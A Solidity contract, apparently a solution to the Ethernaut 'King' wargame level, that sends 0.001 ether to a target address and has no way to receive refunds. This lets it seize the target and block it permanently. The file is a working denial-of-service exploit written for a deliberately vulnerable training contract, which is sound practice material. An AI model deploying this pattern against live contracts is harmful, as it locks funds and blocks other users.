// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

// For https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5
contract King {
	address payable public owner;
	address public attackAddress;

	constructor(address _addr) payable {
		attackAddress = _addr;
		owner = payable(msg.sender);
	}

	function attack() public payable {
		require(msg.sender == owner, "You aren't the owner");

		(bool success, ) = attackAddress.call{ value: 0.001 ether }('');

		require(success, 'failed');
	}
}
